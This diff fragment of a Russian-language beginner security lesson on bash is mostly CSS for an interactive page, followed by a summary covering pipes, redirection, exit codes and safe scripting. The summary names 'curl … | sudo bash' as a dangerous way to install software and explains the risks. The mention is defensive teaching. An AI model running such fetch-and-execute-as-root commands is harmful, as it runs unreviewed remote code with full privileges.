+.ix-bash .bs-io{margin-top:6px;display:grid;grid-template-columns:minmax(0,1.2fr) minmax(0,1fr);gap:16px;align-items:start}
+.ix-bash .bs-io-b{font-size:15px;min-height:150px}
+.ix-bash .bs-io-b p{white-space:pre-wrap}
+.ix-bash .bs-files{display:grid;gap:12px;margin-top:20px}
+.ix-bash .bs-file{border:3px solid var(--ink);background:#fff;box-shadow:4px 4px 0 var(--ink);transition:background .3s}
+.ix-bash .bs-fname{display:flex;align-items:center;gap:8px;padding:6px 10px;border-bottom:2px solid var(--ink);background:#ece6d6;font-family:var(--code);font-weight:800;font-size:15px}
+.ix-bash .bs-fname::before{content:"";width:12px;height:15px;border:2px solid var(--ink);background:#fff;clip-path:polygon(0 0,65% 0,100% 30%,100% 100%,0 100%)}
+.ix-bash .bs-fbody{margin:0;min-height:44px;padding:8px 10px;font-family:var(--code);font-size:13.5px;line-height:1.45;white-space:pre-wrap;overflow-wrap:anywhere;color:var(--ink)}
+.ix-bash .bs-fbody:empty::before{content:"пусто";color:#9d9785;font-family:var(--f-text)}
+.ix-bash .bs-fbody i{font-style:normal;color:var(--muted);font-family:var(--f-cap);font-size:12px}
+.ix-bash .bs-file.bs-fl{background:#fff4b0}
+.ix-bash .bs-file.bs-wipe{background:#ffe1e1;animation:ix-bash-shake .4s}
+.ix-bash .bs-iocap{margin-top:16px;font-size:18px;line-height:1.45}
+.ix-bash .bs-iocap:empty{display:none}
+.ix-bash .bs-iocap b{font-family:var(--f-cap);font-weight:400}
+.ix-bash .bs-redir{list-style:none;margin:0;padding:0;display:grid;gap:12px}
+.ix-bash .bs-redir li{display:flex;align-items:center;gap:14px;font-size:19px;line-height:1.3}
+.ix-bash .bs-redir code{flex:0 0 64px;text-align:center;font-size:22px;font-weight:800;background:var(--ink);color:var(--yel);padding:6px 0;border-radius:0}
+
+/* L4 */
+.ix-bash .bs-post{position:relative;border:3px solid var(--ink);background:var(--ink);color:#fff;padding:16px 16px 18px;box-shadow:5px 5px 0 var(--red);background-image:radial-gradient(rgba(255,214,10,.12) 1.3px,transparent 1.9px);background-size:11px 11px}
+.ix-bash .bs-ph{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.ix-bash .bs-ph b{display:block;font-family:var(--f-cap);font-weight:400;font-size:19px;color:var(--yel)}
+.ix-bash .bs-ph small{display:block;font-size:14px;color:#bdb6a4}
+.ix-bash .bs-av,.ix-bash .bs-bface{flex:0 0 auto;display:grid;place-items:center;width:52px;height:52px;border-radius:50%;background:var(--yel);background-image:repeating-linear-gradient(-45deg,rgba(0,0,0,.85) 0 5px,transparent 5px 11px);border:3px solid var(--yel);font-family:var(--f-mono);font-size:30px;line-height:1;color:var(--yel);text-shadow:0 0 0 #000,-2px 0 #000,2px 0 #000,0 -2px #000,0 2px #000}
+.ix-bash .bs-pt{font-family:var(--f-hand);font-size:23px;line-height:1.22}
+.ix-bash .bs-magic{display:block;margin-top:14px;padding:12px 14px;background:#000;color:var(--yel);border:2px dashed var(--yel);font-size:17px;font-weight:800;line-height:1.4;overflow-wrap:anywhere}
+.ix-bash .bs-script{margin-top:6px;border:3px solid var(--ink);background:var(--ink);box-shadow:5px 5px 0 var(--yel);padding:8px 0}
+.ix-bash .bs-sl{display:flex;gap:10px;width:100%;min-height:44px;align-items:center;padding:6px 12px;background:transparent;border:0;border-left:5px solid transparent;color:var(--tx);text-align:left;cursor:pointer;font-family:var(--code);font-size:15px;line-height:1.4}
+.ix-bash .bs-sl:hover{background:#262626}
+.ix-bash .bs-sl i{flex:0 0 18px;font-style:normal;color:#6f6a5c;font-size:13px;text-align:right}
+.ix-bash .bs-sl code{font-size:15px;font-weight:600;overflow-wrap:anywhere;min-width:0}
+.ix-bash .bs-sl.bs-flag{background:rgba(255,59,59,.24);border-left-color:var(--red)}
+.ix-bash .bs-sl.bs-flag code{color:#ffc2c2}
+.ix-bash .bs-sl.bs-fine{border-left-color:#555}
+.ix-bash .bs-sl.bs-fine code{color:#9d9785}
+.ix-bash .bs-rule{margin:22px 0 0;font-family:var(--f-cap);font-size:22px;line-height:1.3;background:var(--ink);color:#fff;padding:14px 16px;border-left:8px solid var(--red)}
+.ix-bash .bs-rule code{background:var(--yel);color:var(--ink)}
+.ix-bash .bs-why{margin:20px 0 0;padding:0;list-style:none;display:grid;gap:16px;counter-reset:bswhy}
+.ix-bash .bs-why li{position:relative;padding-left:46px;font-size:18px;line-height:1.45;counter-increment:bswhy}
+.ix-bash .bs-why li::before{content:counter(bswhy);position:absolute;left:0;top:0;width:32px;height:32px;display:grid;place-items:center;background:var(--red);color:#fff;font-family:var(--f-cap);font-size:17px}
+.ix-bash .bs-why b{font-family:var(--f-cap);font-weight:400;font-size:20px}
+
+/* L5 */
+.ix-bash .bs-code{margin:6px 0 0;padding:14px 16px;background:var(--ink);color:var(--tx);border:3px solid var(--ink);box-shadow:5px 5px 0 var(--yel);font-family:var(--code);font-size:15px;line-height:1.6;white-space:pre;overflow-x:auto}
+.ix-bash .bs-cm{color:#9d9785}
+.ix-bash .bs-cl-hi{color:var(--yel);font-weight:800}
+.ix-bash .bs-qv{color:var(--green)}
+.ix-bash .bs-codecap{margin:14px 0 22px;font-size:17px;line-height:1.45;color:#3b372e}
+.ix-bash .bs-qdemo{margin-top:4px;padding:16px;background:var(--ink);color:var(--tx);border:3px solid var(--ink);box-shadow:5px 5px 0 var(--yel)}
+.ix-bash .bs-qset{display:block;font-size:16px;color:#bdb6a4;margin-bottom:8px;overflow-wrap:anywhere}
+.ix-bash .bs-cmd-big{font-size:22px}
+.ix-bash .bs-qnote{margin-top:14px;font-size:18px;line-height:1.4;color:#fff}
+.ix-bash .bs-qnote:empty{display:none}
+.ix-bash .bs-qnote b{font-family:var(--f-cap);font-weight:400;color:var(--yel)}
+.ix-bash .bs-cron{display:block;margin-top:4px;padding:14px 16px;background:var(--yel);border:3px solid var(--ink);box-shadow:4px 4px 0 var(--ink);font-size:20px;font-weight:800;overflow-wrap:anywhere}
+
+/* HACK overlay */
+.ix-bash .bs-hack{position:fixed;inset:0;z-index:1000;display:grid;place-items:center;padding:16px;overflow:auto;background:#d81818;color:#fff;background-image:radial-gradient(rgba(20,20,20,.32) 1.6px,transparent 2.4px);background-size:10px 10px}
+.ix-bash .bs-hkin{max-width:560px;width:100%;display:flex;flex-direction:column;align-items:center;gap:18px;text-align:center}
+.ix-bash .bs-hkt{font-family:var(--f-mono);font-size:68px;line-height:1;color:var(--yel);-webkit-text-stroke:3px var(--ink);paint-order:stroke fill;text-shadow:6px 6px 0 var(--ink)}
+.ix-bash .bs-hkterm{width:100%;text-align:left;background:var(--ink);border:3px solid var(--ink);box-shadow:6px 6px 0 var(--yel);padding:14px 16px;font-family:var(--code);font-size:15px;line-height:1.55;transform:rotate(-1deg)}
+.ix-bash .bs-hkterm p{overflow-wrap:anywhere;color:#bdb6a4}
+.ix-bash .bs-hkterm .bs-ok-l{color:var(--green)}
+.ix-bash .bs-hkterm .bs-bad-l{color:#ff8a8a;font-weight:700}
+.ix-bash .bs-hkpl{margin:0;background:var(--ink);padding:10px 18px;border:3px solid var(--ink);box-shadow:5px 5px 0 var(--yel);transform:rotate(2deg)}
+.ix-bash .bs-hkpl .bs-pipe{height:60px}
+.ix-bash .bs-hksay{font-family:var(--f-hand);font-size:26px;line-height:1.15;background:#fff;color:var(--ink);border:3px solid var(--ink);border-radius:16px;padding:6px 16px}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkin{animation:ix-bash-hackin .5s cubic-bezier(.2,1.5,.4,1)}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p{animation:ix-bash-type .3s steps(1) both}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(2){animation-delay:.25s}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(3){animation-delay:.5s}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(4){animation-delay:.75s}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(5){animation-delay:1s}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(6){animation-delay:1.25s}
+.ix-bash.bs-anim .bs-hack.bs-rw{animation:ix-bash-fade .6s ease-in forwards}
+.ix-bash.bs-anim .bs-hack.bs-rw .bs-hkin{animation:ix-bash-rewind .6s ease-in forwards}
+
+/* BATTLE */
+.ix-bash .bs-battle{margin-top:72px;background:var(--ink);color:#fff;border:3px solid var(--ink);box-shadow:8px 8px 0 var(--yel);scroll-margin-top:16px;outline:none}
+.ix-bash .bs-bh{display:flex;align-items:center;gap:16px;padding:18px 20px;border-bottom:3px solid #333}
+.ix-bash .bs-bface{width:84px;height:84px;font-size:46px;text-shadow:-3px 0 #000,3px 0 #000,0 -3px #000,0 3px #000}
+.ix-bash .bs-bface.bs-ow{animation:ix-bash-shake .4s}
+.ix-bash .bs-bhx{flex:1;min-width:0;display:grid;gap:10px}
+.ix-bash .bs-bt{margin:0;font-family:var(--f-mono);font-weight:400;font-size:26px;line-height:1.1;color:var(--yel)}
+.ix-bash .bs-hp{position:relative;height:30px;border:3px solid #fff;background:#2a2a2a;overflow:hidden}
+.ix-bash .bs-hp i{position:absolute;inset:0 auto 0 0;width:100%;background:var(--red);transition:width .6s cubic-bezier(.3,1.5,.5,1);background-image:repeating-linear-gradient(-45deg,rgba(0,0,0,.2) 0 6px,transparent 6px 12px)}
+.ix-bash .bs-hp b{position:absolute;inset:0;display:grid;place-items:center;font-family:var(--f-cap);font-weight:400;font-size:14px;text-shadow:0 0 3px #000,0 0 2px #000}
+.ix-bash .bs-bbody{position:relative;padding:22px 20px 26px}
+.ix-bash .bs-mvn{font-family:var(--f-cap);font-size:14px;color:var(--yel);margin-bottom:10px}
+.ix-bash .bs-vsay{font-family:var(--f-hand);font-size:25px;line-height:1.2;background:#fff;color:var(--ink);border:3px solid var(--ink);border-radius:16px;padding:10px 16px;box-shadow:4px 4px 0 var(--yel);margin-bottom:22px}
+.ix-bash .bs-vsay code{font-size:.7em;background:rgba(255,214,10,.55);padding:0 4px;overflow-wrap:anywhere}
+.ix-bash .bs-bq{font-family:var(--f-cap);font-size:19px;margin-bottom:12px}
+.ix-bash .bs-bopts{display:grid;gap:10px}
+.ix-bash .bs-bo{min-height:60px;padding:12px 16px;border:3px solid #fff;background:transparent;color:#fff;cursor:pointer;text-align:left;font-size:18px;line-height:1.3;transition:background .15s}
+.ix-bash .bs-bo code{background:rgba(255,255,255,.14);padding:0 4px}
+.ix-bash .bs-bo:hover{background:#262626}
+.ix-bash .bs-bo.bs-wrong{border-color:#ff8a8a;color:#ffb3b3;text-decoration:line-through;cursor:default}
+.ix-bash .bs-bo.bs-right{background:var(--green);border-color:var(--green);color:var(--ink)}
+.ix-bash .bs-bo:disabled{cursor:default}
+.ix-bash .bs-bfb{margin-top:16px;font-size:18px;line-height:1.4}
+.ix-bash .bs-bfb b{font-family:var(--f-mono);font-weight:400;font-size:24px;display:block;margin-bottom:2px}
+.ix-bash .bs-bfb.bs-good b{color:var(--green)}
+.ix-bash .bs-bfb.bs-bad b{color:#ff8a8a}
+.ix-bash .bs-boom{position:absolute;z-index:5;right:14px;bottom:70px;padding:20px 24px;font-family:var(--f-mono);font-size:26px;line-height:1;color:var(--ink);background:var(--yel);pointer-events:none;
+  clip-path:polygon(50% 0,61% 22%,85% 6%,78% 33%,100% 38%,80% 55%,96% 78%,70% 72%,62% 100%,48% 78%,30% 98%,28% 72%,2% 82%,18% 56%,0 36%,24% 30%,14% 6%,38% 20%);animation:ix-bash-boom .9s cubic-bezier(.2,1.6,.4,1) forwards}
+.ix-bash .bs-win{display:grid;gap:16px;justify-items:start}
+.ix-bash .bs-wpost{position:relative;width:100%;max-width:440px;min-height:220px;overflow:hidden;border:3px solid #fff;background:#0b0b0b;display:flex;flex-direction:column;justify-content:center;padding:22px;filter:grayscale(1) contrast(1.1)}
+.ix-bash .bs-wpost .bs-pname{font-size:38px}
+.ix-bash .bs-wpost .bs-pline{font-size:20px;margin-top:16px}
+.ix-bash .bs-wpost .bs-pipe{height:60px}
+.ix-bash .bs-wstamp{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%) rotate(-12deg);font-family:var(--f-mono);font-size:30px;color:var(--red);background:rgba(255,255,255,.94);border:5px solid var(--red);padding:6px 14px;white-space:nowrap}
+.ix-bash .bs-win .bs-wstamp-w{position:relative;width:100%;max-width:440px}
+.ix-bash.bs-anim .bs-wstamp{animation:ix-bash-stampw .5s cubic-bezier(.2,1.6,.4,1) .2s both}
+.ix-bash .bs-wint{font-family:var(--f-mono);font-size:30px;line-height:1.1;color:var(--green)}
+.ix-bash .bs-wins{font-size:20px}
+.ix-bash .bs-wins b{font-family:var(--f-mono);font-weight:400;color:var(--yel);font-size:24px}
+.ix-bash .bs-wrule{font-family:var(--f-cap);font-size:20px;line-height:1.3;background:var(--yel);color:var(--ink);padding:14px 16px;border:3px solid #fff}
+
+/* INTERVIEW */
+.ix-bash .bs-iv{margin-top:72px;padding:28px 22px 30px;background:#fff;border:3px solid var(--ink);box-shadow:6px 6px 0 var(--ink)}
+.ix-bash .bs-ivk{font-family:var(--f-cap);font-size:14px;letter-spacing:.06em;color:var(--rdk);margin-bottom:10px}
+.ix-bash .bs-ivq{margin:0 0 20px;font-family:var(--f-cap);font-weight:400;font-size:26px;line-height:1.25}
+.ix-bash .bs-ivq code{font-size:.8em}
+.ix-bash .bs-think{display:grid;gap:4px;margin-bottom:20px;padding:14px 16px;background:var(--paper);border-left:6px solid var(--yel)}
+.ix-bash .bs-think b{font-family:var(--f-cap);font-weight:400;font-size:18px}
+.ix-bash .bs-think span{font-size:18px;line-height:1.45}
+.ix-bash .bs-iva{margin-top:24px;animation:ix-bash-up .4s ease-out}
+.ix-bash .bs-iva ol{margin:0;padding:0;list-style:none;display:grid;gap:18px;counter-reset:bsiv}
+.ix-bash .bs-iva li{position:relative;padding-left:46px;font-size:19px;line-height:1.5;counter-increment:bsiv}
+.ix-bash .bs-iva li::before{content:counter(bsiv);position:absolute;left:0;top:0;width:32px;height:32px;display:grid;place-items:center;background:var(--ink);color:var(--yel);font-family:var(--f-cap);font-size:17px}
+.ix-bash .bs-iva li b{font-weight:700}
+.ix-bash .bs-ivx{margin-top:22px;padding:14px 16px;background:var(--ink);color:#fff;font-size:19px;line-height:1.45}
+.ix-bash .bs-ivx b{color:var(--yel)}
+
+/* CHEAT SHEET */
+.ix-bash .bs-cs{margin-top:72px}
+.ix-bash .bs-cst{margin:0 0 10px;font-family:var(--f-cap);font-weight:400;font-size:30px;line-height:1.15}
+.ix-bash .bs-csl{list-style:none;margin:0;padding:0}
+.ix-bash .bs-csl li{display:flex;gap:18px;align-items:flex-start;padding:20px 0;border-bottom:2px solid rgba(20,20,20,.15)}
+.ix-bash .bs-csl li:last-child{border-bottom:0}
+.ix-bash .bs-csn{flex:0 0 64px;font-family:var(--f-mono);font-size:36px;line-height:1;color:var(--yel);-webkit-text-stroke:2px var(--ink);paint-order:stroke fill}
+.ix-bash .bs-csl div{min-width:0}
+.ix-bash .bs-csl b{display:block;font-family:var(--f-cap);font-weight:400;font-size:21px;line-height:1.2;margin-bottom:4px}
+.ix-bash .bs-csl p{font-size:18px;line-height:1.45}
+.ix-bash .bs-train{margin-top:18px;padding-top:18px;border-top:3px solid var(--ink);font-size:18px;line-height:1.5}
+
+@keyframes ix-bash-drop{from{transform:translateY(-100%)}to{transform:none}}
+@keyframes ix-bash-drop2{from{opacity:0;transform:translateY(-26px) scale(.96)}to{opacity:1;transform:none}}
+@keyframes ix-bash-shake{0%,100%{transform:none}20%{transform:translate(-6px,2px)}40%{transform:translate(5px,-3px)}60%{transform:translate(-4px,1px)}80%{transform:translate(3px,0)}}
+@keyframes ix-bash-pulse{0%,100%{box-shadow:5px 5px 0 var(--red)}50%{box-shadow:5px 5px 0 var(--red),0 0 0 8px rgba(255,214,10,.35)}}
+@keyframes ix-bash-up{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+@keyframes ix-bash-marq{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+@keyframes ix-bash-pipeglow{0%,100%{box-shadow:0 0 18px rgba(255,214,10,.5)}50%{box-shadow:0 0 40px rgba(255,214,10,.95)}}
+@keyframes ix-bash-blink{50%{opacity:0}}
+@keyframes ix-bash-pop{from{opacity:0;transform:translateY(-14px) scale(.8)}to{opacity:1;transform:none}}
+@keyframes ix-bash-flow{from{background-position:0 0}to{background-position:0 9px}}
+@keyframes ix-bash-fall{from{transform:translateY(0)}to{transform:translateY(-50%)}}
+@keyframes ix-bash-glow{0%,100%{box-shadow:0 0 0 rgba(255,214,10,0)}50%{box-shadow:0 0 24px rgba(255,214,10,.9)}}
+@keyframes ix-bash-stamp{from{opacity:0;transform:rotate(-4deg) scale(2.4)}to{opacity:1;transform:rotate(-4deg) scale(1)}}
+@keyframes ix-bash-hackin{from{transform:scale(1.6) rotate(6deg);opacity:0}to{transform:none;opacity:1}}
+@keyframes ix-bash-type{from{opacity:0}to{opacity:1}}
+@keyframes ix-bash-rewind{to{transform:translateX(-120%) skewX(30deg) scale(.6);filter:blur(4px);opacity:0}}
+@keyframes ix-bash-fade{0%,50%{opacity:1}to{opacity:0}}
+@keyframes ix-bash-boom{0%{opacity:0;transform:scale(.2) rotate(-20deg)}25%{opacity:1;transform:scale(1.15) rotate(4deg)}70%{opacity:1;transform:scale(1) rotate(-2deg)}100%{opacity:0;transform:translateY(-14px) rotate(-2deg)}}
+@keyframes ix-bash-stampw{from{opacity:0;transform:translate(-50%,-50%) rotate(-12deg) scale(3)}to{opacity:1;transform:translate(-50%,-50%) rotate(-12deg) scale(1)}}
+
+@media (max-width:760px){
+  .ix-bash .bs-mission{grid-template-columns:1fr;box-shadow:5px 5px 0 var(--yel)}
+  .ix-bash .bs-poster{border-right:0;border-bottom:3px solid var(--yel);min-height:360px;padding:60px 18px 92px}
+  .ix-bash .bs-mbody{padding:22px 16px 24px;gap:16px}
+  .ix-bash .bs-mt{font-size:40px}
+  .ix-bash .bs-moves{grid-template-columns:repeat(6,1fr)}
+  .ix-bash .bs-moves li{grid-column:span 2}
+  .ix-bash .bs-moves li:nth-child(4){grid-column:1/span 3}
+  .ix-bash .bs-moves li:nth-child(5){grid-column:4/span 3}
+  .ix-bash .bs-go{align-self:stretch}
+  .ix-bash .bs-choices,.ix-bash .bs-choices.bs-two-ch{grid-template-columns:1fr}
+  .ix-bash .bs-ch{min-height:72px}
+  .ix-bash .bs-pipe-w{grid-template-columns:minmax(0,1fr)}
+  .ix-bash .bs-ocol{position:relative;top:auto}
+  .ix-bash .bs-scrv{height:200px}
+  .ix-bash .bs-tray{grid-template-columns:repeat(2,minmax(0,1fr))}
+  .ix-bash .bs-io{grid-template-columns:1fr}
+  .ix-bash .bs-files{grid-template-columns:1fr 1fr;margin-top:4px}
+}
+@media (max-width:520px){
+  .ix-bash .bs-lvl{margin-top:40px;box-shadow:4px 4px 0 var(--ink)}
+  .ix-bash .bs-lh{padding:12px 14px}
+  .ix-bash .bs-lt{font-size:20px}
+  .ix-bash .bs-lb{padding:18px 14px 20px}
+  .ix-bash .bs-bub{font-size:21px}
+  .ix-bash .bs-tbody{padding:14px 12px 16px;font-size:15px}
+  .ix-bash .bs-cmd{font-size:17px}
+  .ix-bash .bs-cmd-big{font-size:19px}
+  .ix-bash .bs-wd code{font-size:18px}
+  .ix-bash .bs-q{font-size:20px}
+  .ix-bash .bs-two b{font-size:22px}
+  .ix-bash .bs-big{font-size:23px}
+  .ix-bash .bs-stc code{font-size:15px}
+  .ix-bash .bs-st{padding:9px 10px 10px}
+  .ix-bash .bs-scrv{font-size:12.5px;padding:10px}
+  .ix-bash .bs-scrv .bs-hl{font-size:15px;margin:0 -10px;padding:4px 10px}
+  .ix-bash .bs-blk code{font-size:15px}
+  .ix-bash .bs-line,.ix-bash .bs-line code{font-size:15px}
+  .ix-bash .bs-files{grid-template-columns:1fr}
+  .ix-bash .bs-code{font-size:13px;padding:12px}
+  .ix-bash .bs-sl,.ix-bash .bs-sl code{font-size:13.5px}
+  .ix-bash .bs-sl{padding:6px 10px;gap:8px}
+  .ix-bash .bs-magic{font-size:15px}
+  .ix-bash .bs-rule{font-size:19px}
+  .ix-bash .bs-redir li{font-size:18px}
+  .ix-bash .bs-cron{font-size:17px}
+  .ix-bash .bs-hkt{font-size:48px}
+  .ix-bash .bs-hkterm{font-size:13.5px}
+  .ix-bash .bs-bh{padding:16px 14px;gap:12px}
+  .ix-bash .bs-bface{width:68px;height:68px;font-size:38px}
+  .ix-bash .bs-bt{font-size:20px}
+  .ix-bash .bs-bbody{padding:18px 14px 22px}
+  .ix-bash .bs-vsay{font-size:22px}
+  .ix-bash .bs-wpost .bs-pname{font-size:30px}
+  .ix-bash .bs-iv{padding:22px 16px 24px}
+  .ix-bash .bs-ivq{font-size:22px}
+  .ix-bash .bs-iva li{padding-left:42px;font-size:18px}
+  .ix-bash .bs-cst{font-size:25px}
+  .ix-bash .bs-csl li{gap:14px}
+  .ix-bash .bs-csn{flex-basis:54px;font-size:30px}
+  .ix-bash .bs-hud{padding:7px 8px;gap:6px}
+  .ix-bash .bs-hud-l{font-size:10px}
+  .ix-bash .bs-pips{gap:3px}
+  .ix-bash .bs-pips span{width:20px;height:20px}
+}
+/* dock (sticky tray) */
+.ix-bash .bs-dock{position:sticky;bottom:0;z-index:20;margin:22px -20px 0;padding:12px 20px 14px;background:var(--ink);color:#fff;border-top:3px solid var(--yel)}
+.ix-bash .bs-dock.bs-done{position:relative}
+.ix-bash .bs-dock .bs-trayt{margin:0 0 8px;font-size:15px;color:var(--yel)}
+.ix-bash .bs-dock .bs-tray{margin:0}
+.ix-bash .bs-dock .bs-blk{box-shadow:3px 3px 0 #000;border-color:#000}
+.ix-bash .bs-dock .bs-blk:disabled{background:#3a3a3a;color:#888;opacity:.6}
+.ix-bash .bs-dock .bs-blk:disabled span{color:#888}
+.ix-bash .bs-dock .bs-pair{display:flex;gap:10px;margin-top:10px}
+.ix-bash .bs-btn.bs-sm{min-height:44px;font-size:15px;padding:0 12px;flex:1 1 0;background:#2a2a2a;border-color:#555;box-shadow:none}
+.ix-bash .bs-stbar{position:absolute;left:0;right:0;bottom:0;height:6px;border:0;border-top:2px solid var(--ink)}
+.ix-bash .bs-st{padding:8px 12px 13px}
+@media (max-width:760px){
+  .ix-bash .bs-stages{gap:16px}
+  .ix-bash .bs-st::before{top:-19px;height:16px}
+  .ix-bash .bs-dock .bs-tray{display:flex;overflow-x:auto;gap:10px;padding:2px 2px 6px;scroll-snap-type:x proximity;-webkit-overflow-scrolling:touch}
+  .ix-bash .bs-dock .bs-blk{flex:0 0 150px;min-height:70px;scroll-snap-align:start}
+  .ix-bash .bs-scrv{height:176px}
+}
+@media (max-width:520px){
+  .ix-bash .bs-dock{margin:18px -14px 0;padding:10px 14px 12px}
+  .ix-bash .bs-dock .bs-blk{flex-basis:138px}
+}
+@media (prefers-reduced-motion:reduce){
+  .ix-bash *,.ix-bash *::before,.ix-bash *::after{animation:none !important;transition:none !important}
+  .ix-bash .bs-boom{display:none}
+}
+</style>
+
+<aside class="cc-konspekt" aria-label="Конспект выпуска" data-seo="konspekt"><style>.cc-konspekt{max-width:860px;margin:56px auto 24px;padding:0 16px;box-sizing:border-box;font-family:Rubik,system-ui,sans-serif;color:#141414}.cc-konspekt details{background:#fff;border:3px solid #141414;box-shadow:6px 6px 0 #141414}.cc-konspekt summary{cursor:pointer;list-style:none;display:flex;align-items:center;gap:12px;min-height:56px;padding:12px 18px;box-sizing:border-box;font-family:'Russo One',sans-serif;font-size:20px;line-height:1.25;background:#ffd60a;border-bottom:3px solid transparent}.cc-konspekt summary::-webkit-details-marker{display:none}.cc-konspekt summary::after{content:'+';margin-left:auto;font-size:28px;line-height:1}.cc-konspekt details[open] summary{border-bottom-color:#141414}.cc-konspekt details[open] summary::after{content:'−'}.cc-konspekt summary:focus-visible{outline:3px solid #ff2e93;outline-offset:3px}.cc-konspekt .kb{padding:8px 20px 24px;font-size:18px;line-height:1.6}.cc-konspekt h2{margin:28px 0 10px;font-family:'Russo One',sans-serif;font-size:22px;line-height:1.25}.cc-konspekt h3{margin:0 0 8px;font-family:Rubik,system-ui,sans-serif;font-weight:700;font-size:19px;line-height:1.4}.cc-konspekt p,.cc-konspekt dd,.cc-konspekt li{margin:0 0 12px}.cc-konspekt dl{margin:0}.cc-konspekt dt{font-weight:700;margin-top:14px}.cc-konspekt dd{margin-left:0}.cc-konspekt ul{padding-left:22px;margin:0}.cc-konspekt .lead{font-size:20px}.cc-konspekt .note{font-size:18px;color:#2a2a2a;border-top:2px solid #141414;padding-top:14px;margin-top:24px}</style><details><summary>Конспект выпуска: главное текстом</summary><div class="kb"><h2>Что такое шелл (bash)?</h2><p class="lead"><b>Шелл (bash)</b> — программа, которая читает строку, делит её на слова и запускает команды</p><h2>О чём выпуск</h2><ul><li>Чем терминал отличается от шелла и из чего состоит команда: программа, флаги, аргументы</li><li>Как собрать конвейер grep | awk | sort | uniq -c | sort -nr и найти атакующего в логе</li><li>Куда текут потоки: &gt;, &gt;&gt;, 2&gt; и что значат коды выхода</li><li>Почему curl | sudo bash, rm -rf без кавычек и пароли в командах опасны и как писать безопасные скрипты</li></ul><h2>Словарик</h2><dl><dt>Терминал</dt><dd>Окно для текста: показывает вывод и передаёт нажатия клавиш, но сам команды не выполняет</dd><dt>Шелл (bash)</dt><dd>Программа, которая читает строку, делит её на слова и запускает команды</dd><dt>Конвейер (pipe)</dt><dd>Символ |, который отдаёт вывод одной команды на вход следующей</dd><dt>Перенаправление</dt><dd>&gt; пишет вывод в файл с перезаписью, &gt;&gt; дописывает в конец, 2&gt; уводит ошибки</dd><dt>Код выхода</dt><dd>Число, которое команда возвращает по завершении: 0 — успех, всё остальное — ошибка или «не найдено»; смотреть в $?</dd><dt>Шебанг</dt><dd>Первая строка скрипта вида #!/usr/bin/env bash, которая говорит системе, чем его исполнять</dd></dl><h2>Вопрос с собеседования</h2><h3>В инструкции к утилите написано «curl … | sudo bash». Чем это опасно и как установить её безопасно?</h3><p>Такая строка сразу выполняет код с чужого сервера с правами root, и никто его не читает. Сайт или зеркало могут взломать, сервер может отдать curl | bash другой файл, а при обрыве загрузки bash выполнит половину строки. HTTPS защищает дорогу, а не намерения автора. Безопасно так: пакетный менеджер, а если его нет — скачать файл, сверить подпись или SHA-256 из независимого источника, прочитать, сначала запустить в виртуалке и с минимальными правами. В своих скриптах — кавычки вокруг переменных, set -euo pipefail, ShellCheck и никаких паролей в аргументах команд.</p><p class="note">Практиковаться можно только там, где это разрешено: picoCTF, PortSwigger Web Security Academy, OWASP Juice Shop. Чужие сайты без разрешения трогать нельзя.</p></div></details></aside>
+</div>
+          
+          
+        
+
+      
+
+      
+      <section aria-label="Читай также" class="ir-rel" style="margin-top: 8px; background: #ffffff; border: 3px solid #141414; box-shadow: 6px 6px 0 #141414; padding: 20px 22px; display: flex; flex-direction: column; gap: 14px">
+        <h2 style="margin: 0; font-family: 'Russo One', sans-serif; font-size: 22px">Читай также</h2>
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(min(100%, 230px), 1fr)); gap: 12px">
+          
+            <a href="../../vypuski/linux/" style="display: flex; flex-direction: column; gap: 8px; min-height: 44px; padding: 12px 14px; background: #fff7e3; border: 3px solid #141414; box-shadow: 3px 3px 0 #141414; color: #141414; text-decoration: none"><span style="align-self:flex-start;font-family:'Russo One',sans-serif;font-size:13px;padding:2px 8px;background:#141414;color:#ffd60a">Выпуск №17</span> <span style="font-family: 'Russo One', sans-serif; font-size: 17px; line-height: 1.3">Linux для начинающих: терминал и права</span></a>
+          
+            <a href="../../vypuski/python/" style="display: flex; flex-direction: column; gap: 8px; min-height: 44px; padding: 12px 14px; background: #fff7e3; border: 3px solid #141414; box-shadow: 3px 3px 0 #141414; color: #141414; text-decoration: none"><span style="align-self:flex-start;font-family:'Russo One',sans-serif;font-size:13px;padding:2px 8px;background:#141414;color:#ffd60a">Выпуск №20</span> <span style="font-family: 'Russo One', sans-serif; font-size: 17px; line-height: 1.3">Python для безопасника: первый скрипт</span></a>
+          
+            <a href="../../baraholka/linux/" style="display: flex; flex-direction: column; gap: 8px; min-height: 44px; padding: 12px 14px; background: #fff7e3; border: 3px solid #141414; box-shadow: 3px 3px 0 #141414; color: #141414; text-decoration: none"><span style="align-self:flex-start;font-family:'Russo One',sans-serif;font-size:13px;padding:2px 8px;background:#ff2e93;color:#ffffff">Шпаргалка Барахолки</span> <span style="font-family: 'Russo One', sans-serif; font-size: 17px; line-height: 1.3">Команды Linux: шпаргалка</span></a>
+          
+        </div>
+        <a href="../../vypuski/" style="align-self: flex-start; display: inline-flex; align-items: center; min-height: 44px; font-size: 16px; font-weight: 700; color: #141414; text-underline-offset: 3px">Все выпуски по порядку →</a>
+      </section>
+      
+
+      <nav aria-label="Другие выпуски" style="display: flex; justify-content: space-between; gap: 12px; flex-wrap: wrap">
+        <a href="../../vypuski/git/" style="font-family: 'Russo One', sans-serif; font-size: 16px; text-decoration: none; padding: 12px 18px; background: #ffffff; border: 3px solid #141414; box-shadow: 4px 4px 0 #141414">← №18 Форс-Пушер</a>
+        <a href="../../vypuski/python/" style="font-family: 'Russo One', sans-serif; font-size: 16px; text-decoration: none; padding: 12px 18px; background: #ffd60a; border: 3px solid #141414; box-shadow: 4px 4px 0 #141414">Дальше: №20 Змей Пипыч →</a>
+      </nav>
+    </article>
+  </main>
